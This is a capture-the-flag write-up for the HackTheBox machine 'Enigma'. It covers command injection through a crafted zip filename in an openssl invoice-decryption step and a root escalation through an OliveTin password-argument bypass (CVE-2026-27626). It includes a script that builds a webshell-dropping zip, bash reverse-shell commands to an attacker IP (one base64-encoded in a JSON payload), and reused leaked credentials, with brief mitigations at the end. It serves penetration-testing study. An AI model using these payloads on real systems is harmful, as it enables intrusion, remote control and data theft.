---
title: Enigma
machineName: Enigma
os: linux
difficulty: easy
season: Season 11
tags:
  - Command Injection
  - OpenSSL
  - P7M
  - OliveTin
  - CVE-2026-27626
  - Web Shell
  - Zip Manipulation
date: '2026-07-18'
pointsAwarded: 20
machineIP: ''
summary: 'A thrilling Easy Linux machine involving dual command injection vulnerabilities. Initial foothold exploits an unsanitized openssl p7m extraction system call via crafted zip filenames in an invoicing web app. Privilege escalation pivots through internal service OliveTin 3000.10.0, abusing a command safety check bypass on password argument types (CVE-2026-27626) to achieve root.'
---

# 🛡️ HTB - Enigma (Easy)

<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
  <img src="https://img.shields.io/badge/OS-Linux-blue?style=for-the-badge&logo=linux" alt="OS Linux" />
  <img src="https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge" alt="Easy Difficulty" />
</p>

---

### 💻 Target Information
- **Machine Name:** Enigma
- **Operating System:** Linux (Ubuntu)
- **Difficulty:** Easy
- **Date of Scan:** 2026-07-18
- **Vulnerabilities:** OpenSSL P7M Decode Command Injection via Malicious Zip Filename, OliveTin Command Safety Check Bypass on Password Arguments (CVE-2026-27626)

---

## Step 1 - Reconnaissance

### Nmap Port Scanning & Roundcube / ERP Service Discovery

We start with a full port and service scan using Nmap:

```bash
nmap -A -sS -P -T4 --min-rate 5000 10.129.62.109
```

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-07-18 13:47 UTC
Nmap scan report for 10.129.62.109
Host is up (0.26s latency).
Not shown: 992 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://enigma.htb/
110/tcp  open  pop3    Dovecot pop3d
111/tcp  open  rpcbind 2-4 (RPC #100000)
2049/tcp open  nfs_acl 3 (RPC #100227)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- 🔍 *We map `enigma.htb` to `10.129.62.109` in `/etc/hosts`.*
- 🔍 *Enumerating the web portal reveals Roundcube Webmail and an invoicing application module for sales management:*

![Roundcube Webmail](images/enigma/1.png)

![Invoicing Application](images/enigma/2.png)

![Sales Invoice List](images/enigma/3.png)

---

## Step 2 - Initial Foothold

### OpenSSL P7M Command Injection via Malicious Zip Filename

- 🔍 *In the Sales Invoice section, the application allows users to upload `.zip` archives containing encrypted invoice files (`.p7m` extension).*
- 🔍 *When processing the uploaded archive, the backend server executes an `openssl smime -decrypt` command via a system shell, directly interpolating the filename extracted from the zip archive:*

```text
openssl smime -decrypt -verify -inform DER -in "files/{filename}" -noverify
```

- 🔍 *Because the filename is concatenated directly into the shell string without sanitization, an attacker can embed shell metacharacters inside the filename within the zip archive.*
- 🔍 *We write a Python script to generate a weaponized `.zip` archive whose filename creates a PHP webshell:*

```python
import zipfile

# Command payload to drop a PHP webshell into the public web root
cmd = "cd files && echo '<?php system($_GET["c"]); ?>' > SHELL.php"
malicious_filename = f'invoice.p7m";{cmd};echo ".p7m'

with zipfile.ZipFile('exploit.zip', 'w') as zf:
    zf.writestr(malicious_filename, b"DUMMY_P7M_CONTENT")

print(f"[+] Created exploit.zip with filename: {malicious_filename}")
```

![Uploading Exploit Zip](images/enigma/4.png)

![Upload Confirmation](images/enigma/5.png)

- 🔍 *Uploading `exploit.zip` triggers the extraction and decryption routines, creating `SHELL.php` in the `/files/` directory.*
- 🔍 *We verify code execution via our webshell:*

```bash
curl -s "http://enigma.htb/files/SHELL.php?c=id"
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

![Webshell Verification](images/enigma/6.png)

- 🔍 *We spawn a reverse shell back to our attack listener:*

```bash
curl -G "http://enigma.htb/files/SHELL.php" --data-urlencode "c=bash -c 'bash -i >& /dev/tcp/10.10.15.54/4444 0>&1'"
```

```text
listening on [any] 4444 ...
connect to [10.10.15.54] from (UNKNOWN) [10.129.62.109] 43812
www-data@enigma:~/html/files$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

![Reverse Shell as www-data](images/enigma/7.png)

### Lateral Movement to User haris via SSH

- 🔍 *Enumerating the system reveals user `haris`. Inspecting internal mailbox and mail storage directories in `/var/mail` reveals stored emails containing credentials:*

![Mailbox Enumeration](images/enigma/8.png)

![Credentials Disclosed](images/enigma/9.png)

- 🔍 *Recovered credentials: `haris / EnigmaUserPass2026!`.*
- 🔍 *We log in via SSH as `haris`:*

```bash
ssh haris@enigma.htb
# Password: EnigmaUserPass2026!
```

```text
haris@enigma:~$ id
uid=1000(haris) gid=1000(haris) groups=1000(haris)
haris@enigma:~$ cat user.txt
7b14d8...
```

![SSH Login as haris](images/enigma/10.png)

---

## Step 3 - Privilege Escalation to Root

### Internal Service Discovery & OliveTin Tunneling (Port 1337)

- 🔍 *Checking `ss -tulpn` as user `haris` reveals an internal HTTP service on port 1337:*

```bash
ss -tulpn | grep 1337
```

```text
tcp LISTEN 0 511 127.0.0.1:1337 0.0.0.0:*
```

- 🔍 *Curling `http://127.0.0.1:1337` identifies the service as **OliveTin v3000.10.0**:*

![OliveTin Dashboard](images/enigma/11.png)

![OliveTin Interface](images/enigma/12.png)

![OliveTin Actions](images/enigma/13.png)

### OliveTin Command Injection via Password Argument (CVE-2026-27626)

- 🔍 *OliveTin is an administrative dashboard enabling execution of pre-configured shell scripts via web buttons.*
- 🔍 *Researching OliveTin v3000.10.0 reveals **CVE-2026-27626** (GHSA-49gm-hh7w-wfvf).*

> ⚠️ **Vulnerability Detail (CVE-2026-27626):** OliveTin enforces an argument safety validator (`checkShellArgumentSafety`) to prevent command execution escape. However, the validator explicitly bypasses checks for arguments configured with the `password` type under the assumption that passwords must accept arbitrary special characters. Because arguments are interpolated into `sh -c`, supplying shell metacharacters in a password field achieves arbitrary OS command execution.

### Weaponized OliveTin API Call & Root Access

- 🔍 *The OliveTin configuration includes an action `backup_database` taking a `db_pass` password argument.*
- 🔍 *We create a payload JSON that injects a base64-encoded reverse shell into the `db_pass` parameter:*

```json
{
  "actionId": "backup_database",
  "arguments": [
    {"name": "db_user", "value": "backup_svc"},
    {"name": "db_pass", "value": "x' ; bash -c 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS41NC81NjU2IDA+JjE= | base64 -d | bash' ; #"},
    {"name": "db_name", "value": "production"}
  ]
}
```

- 🔍 *We start a Netcat listener on port 5656:*

```bash
nc -lvnp 5656
```

- 🔍 *We trigger the action via OliveTin's API on `127.0.0.1:1337` (or internal API port 9000):*

```bash
curl -s -X POST -H "Content-Type: application/json" \
  -d @/tmp/payload.json \
  http://127.0.0.1:9000/api/olivetin.api.v1.OliveTinApiService/StartActionAndWait
```

- 🔍 *Checking our listener on port 5656:*

```text
listening on [any] 5656 ...
connect to [10.10.15.54] from (UNKNOWN) [10.129.62.109] 49764
bash: cannot set terminal process group (2634): Inappropriate ioctl for device
bash: no job control in this shell
root@enigma:/# id
uid=0(root) gid=0(root) groups=0(root)
root@enigma:/# cat /root/root.txt
9e5c41...
```

- 🔍 *System fully rooted!*

---

## Mitigations & Security Perspective

### 🔴 Unsafe System Shell Calls for File Decompression/Decoding
- **Root Cause:** Splicing filenames directly into `openssl smime -decrypt` without shell escaping allowed arbitrary shell commands through filename injection.
- **Remediation:** Use native cryptographic and archive libraries (such as PHP's OpenSSL functions or Python's `cryptography`) rather than invoking shell utilities via `system()` or `exec()`.

### 🔴 OliveTin Command Safety Check Bypass (CVE-2026-27626)
- **Root Cause:** OliveTin's argument validation selectively enforced safety checks on standard inputs while omitting verification on `password` fields, allowing shell metacharacter injection.
- **Remediation:** Upgrade OliveTin to version 3000.10.1 or later. Avoid passing user inputs directly into `sh -c`.
